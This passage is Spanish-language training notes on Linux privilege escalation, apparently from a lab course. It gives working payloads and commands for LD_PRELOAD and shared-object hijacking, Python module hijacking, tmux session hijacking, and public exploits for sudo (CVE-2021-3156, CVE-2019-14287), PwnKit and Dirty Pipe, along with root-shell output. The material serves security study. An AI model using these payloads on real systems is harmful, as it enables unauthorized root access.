drwxrwxrwt 10 root  root   4096 Sep  1 06:15 .
drwxr-xr-x 24 root  root   4096 Aug 31 02:24 ..
drwxrwxrwt  2 root  root   4096 Sep  1 05:35 .font-unix
drwxrwxrwt  2 root  root   4096 Sep  1 05:35 .ICE-unix
-rwsr-xr-x  1 root  root  16712 Sep  1 06:15 shell
<SNIP>
```

```shell-session
htb@NIX02:/tmp$ ./shell
root@NIX02:/tmp# id

uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1000(htb)
```

---

### Secuestro de Sesiones Tmux

Multiplexores de terminales como [tmux](https://en.wikipedia.org/wiki/Tmux) se puede utilizar para permitir el acceso a múltiples sesiones de terminal dentro de una sola sesión de consola. Cuando no se trabaja en un `tmux` ventana, podemos separarnos de la sesión, dejándola activa (es decir, ejecutando un `nmap` escanear). Por muchas razones, un usuario puede dejar un `tmux` proceso que se ejecuta como un usuario privilegiado, como la configuración raíz con permisos débiles, y puede ser secuestrado. Esto se puede hacer con los siguientes comandos para crear una nueva sesión compartida y modificar la propiedad.

```shell-session
htb@NIX02:~$ tmux -S /shareds new -s debugsess
htb@NIX02:~$ chown root:devs /shareds
```

Si podemos comprometer a un usuario en el `devs` grupo, podemos adjuntar a esta sesión y obtener acceso root.

Compruebe si hay alguna carrera `tmux` procesos.

```shell-session
htb@NIX02:~$  ps aux | grep tmux

root      4806  0.0  0.1  29416  3204 ?        Ss   06:27   0:00 tmux -S /shareds new -s debugsess
```

Confirmar permisos.

```shell-session
htb@NIX02:~$ ls -la /shareds 

srw-rw---- 1 root devs 0 Sep  1 06:27 /shareds
```

Revise nuestra membresía grupal.

```shell-session
htb@NIX02:~$ id

uid=1000(htb) gid=1000(htb) groups=1000(htb),1011(devs)
```

Finalmente, adjúntese al `tmux` session y confirmar privilegios de root.

```shell-session
htb@NIX02:~$ tmux -S /shareds

id

uid=0(root) gid=0(root) groups=0(root)
```


# Escalada interna de Linux

## Kernel exploits

Hay varios sistemas con el kernel vulnerable, esto se hace de la siguiente manera

Comencemos comprobando el nivel de Kernel y la versión de Linux OS.

```shell-session
vcrdcr@htb[/htb]$ uname -a

Linux NIX02 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```

```shell-session
vcrdcr@htb[/htb]$ cat /etc/lsb-release 

DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.4 LTS"
```

Podemos ver que estamos en Linux Kernel 4.4.0-116 en un cuadro Ubuntu 16.04.4 LTS. Una búsqueda rápida en Google para `linux 4.4.0-116-generic exploit` se le ocurre [esto](https://vulners.com/zdt/1337DAY-ID-30003) explotar PoC. Luego descárguelo al sistema usando `wget` u otro método de transferencia de archivos. Podemos compilar el código de explotación utilizando [gcc](https://linux.die.net/man/1/gcc) y establezca el bit ejecutable usando `chmod +x`.

```shell-session
vcrdcr@htb[/htb]$ gcc kernel_exploit.c -o kernel_exploit && chmod +x kernel_exploit
```

A continuación, ejecutamos el exploit y, con suerte, nos dejan caer en un caparazón raíz.

```shell-session
vcrdcr@htb[/htb]$ ./kernel_exploit 

task_struct = ffff8800b71d7000
uidptr = ffff8800b95ce544
spawning root shell
```

Finalmente, podemos confirmar el acceso raíz a la caja.

```shell-session
root@htb[/htb]# whoami

root
```

>Nota: El sistema de destino se ha actualizado, pero sigue siendo vulnerable. Utilice un exploit de kernel creado en 2021.


## Shared Libraries

Existen dos tipos de bibliotecas en Linux: `static libraries` (denotado por la extensión de archivo .a) y `dynamically linked shared object libraries` (denotado por la extensión de archivo .so). Cuando se compila un programa, las bibliotecas estáticas se convierten en parte del programa y no pueden ser alteradas. Sin embargo, las bibliotecas dinámicas se pueden modificar para controlar la ejecución del programa que las llama.

Existen múltiples métodos para especificar la ubicación de las bibliotecas dinámicas, por lo que el sistema sabrá dónde buscarlas en la ejecución del programa. Esto incluye el `-rpath` o `-rpath-link` banderas al compilar un programa, utilizando las variables ambientales `LD_RUN_PATH` o `LD_LIBRARY_PATH`, colocando bibliotecas en el `/lib` o `/usr/lib` directorios predeterminados, o especificar otro directorio que contenga las bibliotecas dentro del `/etc/ld.so.conf` archivo de configuración.

Además, el `LD_PRELOAD` la variable de entorno puede cargar una biblioteca antes de ejecutar un binario. Las funciones de esta biblioteca tienen preferencia sobre las predeterminadas. Los objetos compartidos requeridos por un binario se pueden ver usando el `ldd` utilidad.

```shell-session
htb_student@NIX02:~$ ldd /bin/ls

	linux-vdso.so.1 =>  (0x00007fff03bc7000)
	libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007f4186288000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4185ebe000)
	libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f4185c4e000)
	libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f4185a4a000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f41864aa000)
	libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f418582d000)
```

La imagen de arriba enumera todas las bibliotecas requeridas por `/bin/ls`, junto con sus caminos absolutos.

---

### LD_PRELOAD Escalada de Privilegios

Veamos un ejemplo de cómo podemos utilizar el [LD_PRECARGAR](https://web.archive.org/web/20231214050750/https://blog.fpmurphy.com/2012/09/all-about-ld_preload.html) variable de entorno para escalar privilegios. Para esto, necesitamos un usuario con `sudo` privilegios.

```shell-session
htb_student@NIX02:~$ sudo -l

Matching Defaults entries for daniel.carter on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User daniel.carter may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/apache2 restart
```

Este usuario tiene derechos para reiniciar el servicio Apache como root, pero como esto es `NOT` a [GTFOBina](https://gtfobins.github.io/#apache) y el `/etc/sudoers` la entrada se escribe especificando la ruta absoluta, esto no se podría utilizar para escalar privilegios en circunstancias normales. Sin embargo, podemos explotar el `LD_PRELOAD` problema para ejecutar un archivo de biblioteca compartido personalizado. Compilemos la siguiente biblioteca:

Código: c

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

Podemos compilar esto de la siguiente manera:

```shell-session
htb_student@NIX02:~$ gcc -fPIC -shared -o root.so root.c -nostartfiles
```

Finalmente, podemos escalar privilegios usando el siguiente comando. Asegúrese de especificar la ruta completa a su archivo de biblioteca malicioso.

```shell-session
htb_student@NIX02:~$ sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart

id
uid=0(root) gid=0(root) groups=0(root)
```

## Shared Object Hijacking

Los programas y binarios en desarrollo generalmente tienen bibliotecas personalizadas asociadas con ellos. Considere lo siguiente `SETUID` binario.

```shell-session
htb-student@NIX02:~$ ls -la payroll

-rwsr-xr-x 1 root root 16728 Sep  1 22:05 payroll
```

Podemos usar [ldd](https://manpages.ubuntu.com/manpages/bionic/man1/ldd.1.html) para imprimir el objeto compartido requerido por un objeto binario o compartido. `Ldd` muestra la ubicación del objeto y la dirección hexadecimal donde se carga en la memoria para cada una de las dependencias de un programa.

```shell-session
htb-student@NIX02:~$ ldd payroll

linux-vdso.so.1 =>  (0x00007ffcb3133000)
libshared.so => /development/libshared.so (0x00007f0c13112000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)
/lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)
```

Vemos una biblioteca no estándar nombrada `libshared.so` listado como una dependencia para el binario. Como se indicó anteriormente, es posible cargar bibliotecas compartidas desde ubicaciones personalizadas. Una de esas configuraciones es la `RUNPATH` configuración. Las bibliotecas en esta carpeta tienen preferencia sobre otras carpetas. Esto se puede inspeccionar usando el [readelf](https://man7.org/linux/man-pages/man1/readelf.1.html) utilidad.

```shell-session
htb-student@NIX02:~$ readelf -d payroll  | grep PATH

 0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

La configuración permite la carga de bibliotecas desde el `/development` carpeta, que es escribible por todos los usuarios. Esta configuración incorrecta se puede explotar colocando una biblioteca maliciosa en `/development`, que tendrá prioridad sobre otras carpetas porque las entradas en este archivo se comprueban primero (antes de otras carpetas presentes en los archivos de configuración).

```shell-session
htb-student@NIX02:~$ ls -la /development/

total 8
drwxrwxrwx  2 root root 4096 Sep  1 22:06 ./
drwxr-xr-x 23 root root 4096 Sep  1 21:26 ../
```

Antes de compilar una biblioteca, necesitamos encontrar el nombre de la función llamado por el binario.

```shell-session
htb-student@NIX02:~$ ldd payroll

linux-vdso.so.1 (0x00007ffd22bbc000)
libshared.so => /development/libshared.so (0x00007f0c13112000)
/lib64/ld-linux-x86-64.so.2 (0x00007f0c1330a000)
```

```shell-session
htb-student@NIX02:~$ cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
```

```shell-session
htb-student@NIX02:~$ ./payroll 

./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery
```

Podemos copiar una biblioteca existente a la `development` carpeta. Corriendo `ldd` contra las listas binarias la ruta de la biblioteca como `/development/libshared.`entonces, lo que significa que es vulnerable. Ejecutar el binario arroja un error que indica que no pudo encontrar la función nombrada `dbquery`. Podemos compilar un objeto compartido que incluye esta función.

Código: c

```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
} 

```

El `dbquery` la función establece nuestro id de usuario en 0 (root) y ejecución `/bin/sh` cuando se llama. Compílalo usando [CCG](https://linux.die.net/man/1/gcc).

```shell-session
htb-student@NIX02:~$ gcc src.c -fPIC -shared -o /development/libshared.so
```

Ejecutar el binario nuevamente debería mostrar el banner y mostrar un shell raíz.

```shell-session
htb-student@NIX02:~$ ./payroll 

***************Inlane Freight Employee Database***************

Malicious library loaded
# id
uid=0(root) gid=1000(mrb3n) groups=1000(mrb3n)
```

## Python Library Hijacking

Hay muchas maneras en que podemos secuestrar una biblioteca de Python. Mucho depende del guión y su contenido en sí. Sin embargo, hay tres vulnerabilidades básicas donde se puede utilizar el secuestro:

1. Permisos de escritura incorrectos
2. Ruta de la Biblioteca
3. variable de entorno PYTHONPATH

### Permisos de Escritura Incorrecta

Por ejemplo, podemos imaginar que estamos en el host de un desarrollador en la intranet de la compañía y que el desarrollador está trabajando con python. Así que tenemos un total de tres componentes que están conectados. Este es el script python real que importa un módulo python y los privilegios del script, así como los permisos del módulo.

Uno u otro módulo python puede tener permisos de escritura establecidos para todos los usuarios por error. Esto permite que el módulo python sea editado y manipulado para que podamos insertar comandos o funciones que producirán los resultados que queremos. Si `SUID`/`SGID` se han asignado permisos al script Python que importa este módulo, nuestro código se incluirá automáticamente.

Si miramos los permisos establecidos de la `mem_status.py` guión, podemos ver que tiene un `SUID` conjunto.

#### Script Python

```shell-session
htb-student@lpenix:~$ ls -l mem_status.py

-rwsrwxr-x 1 root mrb3n 188 Dec 13 20:13 mem_status.py
```

Así podemos ejecutar este script con los privilegios de otro usuario, en nuestro caso, como `root`. También tenemos permiso para ver el script y leer su contenido.


#### Python Script - Contenido

Código: pitón

```python
#!/usr/bin/env python3
import psutil

available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total

print(f"Available memory: {round(available_memory, 2)}%")
```

Así que este script es bastante simple y solo muestra la memoria virtual disponible en porcentaje. También podemos ver en la segunda línea que este script importa el módulo `psutil` y utiliza la función `virtual_memory()`.

Así que podemos buscar esta función en la carpeta de `psutil` y compruebe si este módulo tiene permisos de escritura para nosotros.

#### Permisos de Módulo

```shell-session
htb-student@lpenix:~$ grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*

/usr/local/lib/python3.8/dist-packages/psutil/__init__.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psaix.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psbsd.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pslinux.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psosx.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pssunos.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pswindows.py:def virtual_memory():


htb-student@lpenix:~$ ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

-rw-r--rw- 1 root staff 87339 Dec 13 20:07 /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
```

Dichos permisos son más comunes en entornos de desarrolladores donde muchos desarrolladores trabajan en diferentes scripts y pueden requerir privilegios más altos.

#### Contenido del Módulo

Código: pitón

```python
...SNIP...

def virtual_memory():

	...SNIP...
	
    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret

...SNIP...
```

Esta es la parte de la biblioteca donde podemos insertar nuestro código. Se recomienda ponerlo justo al comienzo de la función. Allí podemos insertar todo lo que consideremos correcto y efectivo. Podemos importar el módulo `os` para fines de prueba, lo que nos permite ejecutar comandos del sistema. Con esto, podemos insertar el comando `id` y compruebe durante la ejecución del script si se ejecuta el código insertado.

#### Contenido del Módulo - Hijacking

Código: pitón

```python
...SNIP...

def virtual_memory():

	...SNIP...
	#### Hijacking
	import os
	os.system('id')
	

    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret

...SNIP...
```

Ahora podemos ejecutar el script con `sudo` y compruebe si obtenemos el resultado deseado.

#### Escalada Privilegio

```shell-session
htb-student@lpenix:~$ sudo /usr/bin/python3 ./mem_status.py

uid=0(root) gid=0(root) groups=0(root)
uid=0(root) gid=0(root) groups=0(root)
Available memory: 79.22%
```

Éxito. Como podemos ver en el resultado anterior, pudimos secuestrar con éxito la biblioteca y tener nuestro código dentro del `virtual_memory()` la función funciona como `root`. Ahora que tenemos el resultado deseado, podemos editar la biblioteca de nuevo, pero esta vez, insertar un shell inverso que se conecta a nuestro host como `root`.


### Ruta de la Biblioteca

En Python, cada versión tiene un orden específico en el que las bibliotecas (`modules`) se buscan e importan desde. El orden en que importa Python `modules` los de se basan en un sistema de prioridad, lo que significa que las rutas más altas en la lista tienen prioridad sobre las más bajas en la lista. Podemos ver esto emitiendo el siguiente comando:

#### Listado de PYTHONPATH

```shell-session
htb-student@lpenix:~$ python3 -c 'import sys; print("\n".join(sys.path))'

/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages
```

Para poder utilizar esta variante, son necesarios dos requisitos previos.

1. El módulo importado por el script se encuentra debajo de una de las rutas de menor prioridad enumeradas a través del `PYTHONPATH` variable.
2. Debemos tener permisos de escritura en una de las rutas que tienen una prioridad más alta en la lista.

Para que esto tenga un poco más de sentido, continuemos con el ejemplo anterior y mostremos cómo se puede explotar. Anteriormente, el `psutil` el módulo fue importado al `mem_status.py` guión. Podemos ver `psutil`'s ubicación de instalación predeterminada emitiendo el siguiente comando:

#### Psutil Ubicación Default de la instalación

```shell-session
htb-student@lpenix:~$ pip3 show psutil

...SNIP...
Location: /usr/local/lib/python3.8/dist-packages

...SNIP...
```

De este ejemplo, podemos ver eso `psutil` se instala en la siguiente ruta: `/usr/local/lib/python3.8/dist-packages`. De nuestra lista anterior de la `PYTHONPATH` variable, tenemos una cantidad razonable de directorios para elegir para ver si puede haber alguna configuración incorrecta en el entorno que nos permita `write` acceso a cualquiera de ellos. Comprobamos.

#### Permisos de Directorio mal configurados

```shell-session
htb-student@lpenix:~$ ls -la /usr/lib/python3.8

total 4916
drwxr-xrwx 30 root root  20480 Dec 14 16:26 .
...SNIP...
```

Después de verificar todos los directorios enumerados, parece que `/usr/lib/python3.8` la ruta está mal configurada para permitir que cualquier usuario le escriba. Cross-checking con valores de la `PYTHONPATH` variable, podemos ver que esta ruta es más alta en la lista que la ruta en la que `psutil` está instalado en. Intentemos abusar de esta configuración errónea para crear la nuestra `psutil` módulo que contiene nuestro propio malicioso `virtual_memory()` función dentro del `/usr/lib/python3.8` directorio.

#### Contenido del Módulo Secuestrado - psutil.py

Código: pitón

```python
#!/usr/bin/env python3

import os

def virtual_memory():
    os.system('id')
```

Para llegar a este punto, necesitamos crear un archivo llamado `psutil.py` conteniendo los contenidos enumerados anteriormente en el directorio mencionado anteriormente. Es muy importante que nos aseguremos de que el módulo que creamos tenga el mismo nombre que la importación, así como que tenga la misma función con el número correcto de argumentos que se le pasan como la función que pretendemos secuestrar. Esto es crítico ya que sin que ninguna de estas condiciones sea `true`, no podremos realizar este ataque. Después de crear este archivo que contiene el ejemplo de nuestro script de secuestro anterior, hemos preparado con éxito el sistema para su explotación.

Corramos una vez más el `mem_status.py` script usando `sudo` como en el ejemplo anterior.

#### Privilege Escalation vía Hijacking Python Library Path

```shell-session
htb-student@lpenix:~$ sudo /usr/bin/python3 mem_status.py

uid=0(root) gid=0(root) groups=0(root)
Traceback (most recent call last):
  File "mem_status.py", line 4, in <module>
    available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
AttributeError: 'NoneType' object has no attribute 'available' 
```

Como podemos ver en la salida, hemos ganado con éxito la ejecución como `root` mediante el secuestro de la ruta del módulo a través de una configuración incorrecta en los permisos de la `/usr/lib/python3.8` directorio.


### PYTHONPATH Entorno Variable

En la sección anterior, tocamos el término `PYTHONPATH`, sin embargo, no explicó completamente su uso e importancia con respecto a la funcionalidad de Python. `PYTHONPATH` es una variable de entorno que indica qué directorio (o directorios) Python puede buscar módulos para importar. Esto es importante, ya que si un usuario puede manipular y establecer esta variable mientras ejecuta el binario python, puede redirigir efectivamente la funcionalidad de búsqueda de Python a un `user-defined` ubicación cuando llega el momento de importar módulos. Podemos ver si tenemos los permisos para establecer variables de entorno para el binario python comprobando nuestro `sudo` permisos:

#### Comprobación de permisos sudo

```shell-session
htb-student@lpenix:~$ sudo -l 

Matching Defaults entries for htb-student on ACADEMY-LPENIX:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on ACADEMY-LPENIX:
    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
```

Como podemos ver en el ejemplo, se nos permite correr `/usr/bin/python3` bajo los permisos confiables de `sudo` y por lo tanto se les permite establecer variables de entorno para su uso con este binario por el `SETENV:` bandera que se está estableciendo. Es importante tener en cuenta que debido a la naturaleza confiable de `sudo`, cualquier variable de entorno definida antes de llamar al binario no está sujeta a ninguna restricción con respecto a poder establecer variables de entorno en el sistema. Esto significa que usar el `/usr/bin/python3` binario, podemos establecer efectivamente cualquier variable de entorno en el contexto de nuestro programa en ejecución. Intentemos hacerlo ahora usando el `psutil.py` script de la última sección.

#### Escalada de Privilegio usando PYTHONPATH Environment Variable

```shell-session
htb-student@lpenix:~$ sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py

uid=0(root) gid=0(root) groups=0(root)
...SNIP...
```

En este ejemplo, movimos el script python anterior del `/usr/lib/python3.8` directorio a `/tmp`. Desde aquí llamamos una vez más `/usr/bin/python3` correr `mem_stats.py`, sin embargo, especificamos que el `PYTHONPATH` la variable contiene el `/tmp` directorio para que obligue a Python a buscar ese directorio buscando el `psutil` módulo para importar. Como podemos ver, una vez más hemos ejecutado con éxito nuestro script en el contexto de root.

# Recent 0-Days
## Sudo
El programa `sudo` se utiliza bajo sistemas operativos UNIX como Linux o macOS para iniciar procesos con los derechos de otro usuario. En la mayoría de los casos, se ejecutan comandos que solo están disponibles para los administradores. Sirve como una capa adicional de seguridad o una salvaguardia para evitar que el sistema y su contenido sean dañados por usuarios no autorizados. El `/etc/sudoers` file especifica qué usuarios o grupos pueden ejecutar programas específicos y con qué privilegios.

```shell-session
cry0l1t3@nix02:~$ sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'
[sudo] password for cry0l1t3:  **********

Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
Defaults        use_pty
root            ALL=(ALL:ALL) ALL
%admin          ALL=(ALL) ALL
%sudo           ALL=(ALL:ALL) ALL
cry0l1t3        ALL=(ALL) /usr/bin/id
@includedir     /etc/sudoers.d
```

Una de las últimas vulnerabilidades para `sudo` lleva el CVE-2021-3156 y se basa en una vulnerabilidad de desbordamiento de búfer basado en memoria dinámica. Esto afectó a las versiones sudo:

- 1.8.31 - Ubuntu 20.04
- 1.8.27 - Debian 10
- 1.9.2 - Fedora 33
- y otros

Para averiguar la versión de `sudo`, el siguiente comando es suficiente:

```shell-session
cry0l1t3@nix02:~$ sudo -V | head -n1

Sudo version 1.8.31
```

Lo interesante de esta vulnerabilidad fue que había estado presente durante más de diez años hasta que se descubrió. También hay un público [Prueba de Concepto](https://github.com/blasty/CVE-2021-3156) eso se puede usar para esto. Podemos descargar esto a una copia del sistema de destino que hemos creado o, si tenemos una conexión a Internet, al sistema de destino en sí.

```shell-session
cry0l1t3@nix02:~$ git clone https://github.com/blasty/CVE-2021-3156.git
cry0l1t3@nix02:~$ cd CVE-2021-3156
cry0l1t3@nix02:~$ make

rm -rf libnss_X
mkdir libnss_X
gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c
```

Al ejecutar el exploit, se nos puede mostrar una lista que enumerará todas las versiones disponibles de los sistemas operativos que pueden verse afectados por esta vulnerabilidad.

```shell-session
cry0l1t3@nix02:~$ ./sudo-hax-me-a-sandwich

** CVE-2021-3156 PoC by blasty <peter@haxx.in>

  usage: ./sudo-hax-me-a-sandwich <target>

  available targets:
  ------------------------------------------------------------
    0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27
    1) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
    2) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28
  ------------------------------------------------------------

  manual mode:
    ./sudo-hax-me-a-sandwich <smash_len_a> <smash_len_b> <null_stomp_len> <lc_all_len>
```

Podemos averiguar qué versión del sistema operativo estamos tratando con el siguiente comando:

```shell-session
cry0l1t3@nix02:~$ cat /etc/lsb-release

DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=20.04
DISTRIB_CODENAME=focal
DISTRIB_DESCRIPTION="Ubuntu 20.04.1 LTS"
```

A continuación, especificamos el ID respectivo para el sistema operativo de la versión y ejecutamos el exploit con nuestra carga útil.

```shell-session
cry0l1t3@nix02:~$ ./sudo-hax-me-a-sandwich 1

** CVE-2021-3156 PoC by blasty <peter@haxx.in>

using target: Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31 ['/usr/bin/sudoedit'] (56, 54, 63, 212)
** pray for your rootshell.. **

# id

uid=0(root) gid=0(root) groups=0(root)
```

### Bypass de la política de Sudo

Se encontró otra vulnerabilidad en 2019 que afectó a todas las versiones a continuación `1.8.28`, lo que permitió que los privilegios se intensificaran incluso con un comando simple. Esta vulnerabilidad tiene el [CVE-2019-14287](https://www.sudo.ws/security/advisories/minus_1_uid/) y requiere solo un único requisito previo. Tenía que permitir a un usuario en el `/etc/sudoers` archivo para ejecutar un comando específico.

```shell-session
cry0l1t3@nix02:~$ sudo -l
[sudo] password for cry0l1t3: **********

User cry0l1t3 may run the following commands on Penny:
    ALL=(ALL) /usr/bin/id
```

De hecho, `Sudo` también permite ejecutar comandos con ID de usuario específicos, lo que ejecuta el comando con los privilegios del usuario que llevan el ID especificado. El ID del usuario específico se puede leer desde el `/etc/passwd` archivo.

```shell-session
cry0l1t3@nix02:~$ cat /etc/passwd | grep cry0l1t3

cry0l1t3:x:1005:1005:cry0l1t3,,,:/home/cry0l1t3:/bin/bash
```

De este modo, el ID para el usuario `cry0l1t3` sería `1005`. Si una ID negativa (`-1`) se ingresa en `sudo`, esto da como resultado el procesamiento de la ID `0`, que sólo el `root` tiene. Esto, por lo tanto, condujo a la cubierta raíz inmediata.

```shell-session
cry0l1t3@nix02:~$ sudo -u#-1 id

root@nix02:/home/cry0l1t3# id

uid=0(root) gid=1005(cry0l1t3) groups=1005(cry0l1t3)
```

## Polkit

PolicyKit (`polkit`) es un servicio de autorización en sistemas operativos basados en Linux que permite que el software del usuario y los componentes del sistema se comuniquen entre sí si el software del usuario está autorizado para hacerlo. Para verificar si el software del usuario está autorizado para esta instrucción, `polkit` se le pregunta. Es posible establecer cómo se otorgan los permisos de forma predeterminada para cada usuario y aplicación. Por ejemplo, para cada usuario, se puede establecer si la operación debe ser generalmente permitida o prohibida, o se debe requerir autorización como administrador o como usuario separado con una validez única, limitada por proceso, limitada por sesión o ilimitada. Para usuarios y grupos individuales, las autorizaciones se pueden asignar individualmente.

Polkit funciona con dos grupos de archivos.

1. acciones/políticas (`/usr/share/polkit-1/actions`)
2. reglas (`/usr/share/polkit-1/rules.d`)

Polkit también tiene `local authority` reglas que se pueden usar para establecer o eliminar permisos adicionales para usuarios y grupos. Las reglas personalizadas se pueden colocar en el directorio `/etc/polkit-1/localauthority/50-local.d` con la extensión de archivo `.pkla`.

PolKit también viene con tres programas adicionales:

- `pkexec`- ejecuta un programa con los derechos de otro usuario o con derechos de root
- `pkaction`- se puede utilizar para mostrar acciones
- `pkcheck`esto se puede usar para verificar si un proceso está autorizado para una acción específica

La herramienta más interesante para nosotros, en este caso, es `pkexec` porque realiza la misma tarea que `sudo` y puede ejecutar un programa con los derechos de otro usuario o root.

```shell-session
cry0l1t3@nix02:~$ # pkexec -u <user> <command>
cry0l1t3@nix02:~$ pkexec -u root id

uid=0(root) gid=0(root) groups=0(root)
```

En el `pkexec` herramienta, la vulnerabilidad de corrupción de memoria con el identificador [CVE-2021-4034](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4034) fue encontrado, también conocido como [Pwnkit](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034) y también conduce a la escalada de privilegios. Esta vulnerabilidad también estuvo oculta durante más de diez años, y nadie puede decir con precisión cuándo fue descubierta y explotada. Finalmente, en noviembre de 2021, esta vulnerabilidad se publicó y se solucionó dos meses después.

Para explotar esta vulnerabilidad, necesitamos descargar un [PoC](https://github.com/arthepsy/CVE-2021-4034) y compílelo en el sistema de destino en sí o en una copia que hayamos hecho.

```shell-session
cry0l1t3@nix02:~$ git clone https://github.com/arthepsy/CVE-2021-4034.git
cry0l1t3@nix02:~$ cd CVE-2021-4034
cry0l1t3@nix02:~$ gcc cve-2021-4034-poc.c -o poc
```

Una vez que hayamos compilado el código, podemos ejecutarlo sin más preámbulos. Después de la ejecución, cambiamos del shell estándar (`sh`) a Bash (`bash`) y compruebe los ID del usuario.

```shell-session
cry0l1t3@nix02:~$ ./poc

# id

uid=0(root) gid=0(root) groups=0(root)
```

## Dirty Pipe

Una vulnerabilidad en el kernel de Linux, llamada [Tubo Sucio](https://dirtypipe.cm4all.com/) ([CVE-2022-0847](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0847)), permite la escritura no autorizada a archivos de usuario raíz en Linux. Técnicamente, la vulnerabilidad es similar a la [Vaca Sucia](https://dirtycow.ninja/) vulnerabilidad descubierta en 2016. Todos los kernels de la versión `5.8` a `5.17` son afectados y vulnerables a esta vulnerabilidad.

En términos simples, esta vulnerabilidad permite a un usuario escribir en archivos arbitrarios siempre que tenga acceso de lectura a estos archivos. También es interesante observar que los teléfonos Android también se ven afectados. Las aplicaciones de Android se ejecutan con derechos de usuario, por lo que una aplicación maliciosa o comprometida podría hacerse cargo del teléfono.

Esta vulnerabilidad se basa en tuberías. Las tuberías son un mecanismo de comunicación unidireccional entre procesos que son particularmente populares en los sistemas Unix. Por ejemplo, podríamos editar el `/etc/passwd` archiva y elimina el mensaje de contraseña para la raíz. Esto nos permitiría iniciar sesión con el `su` comando sin el mensaje de contraseña.

Para explotar esta vulnerabilidad, necesitamos descargar un [PoC](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits) y compílelo en el sistema de destino en sí o en una copia que hayamos hecho.

#### Descargar Dirty Pipe Exploit

```shell-session
cry0l1t3@nix02:~$ git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cry0l1t3@nix02:~$ cd CVE-2022-0847-DirtyPipe-Exploits
cry0l1t3@nix02:~$ bash compile.sh
```

Después de compilar el código, tenemos dos exploits diferentes disponibles. La primera versión exploit (`exploit-1`) modifica el `/etc/passwd` y nos da un mensaje con privilegios de root. Para esto, necesitamos verificar la versión del kernel y luego ejecutar el exploit.

#### Verifique la versión de Kernel

```shell-session
cry0l1t3@nix02:~$ uname -r

5.13.0-46-generic
```

#### Explotación

```shell-session
cry0l1t3@nix02:~$ ./exploit-1

Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to "piped"...
Password: Restoring /etc/passwd from /tmp/passwd.bak...
Done! Popping shell... (run commands now)

id

uid=0(root) gid=0(root) groups=0(root)
```

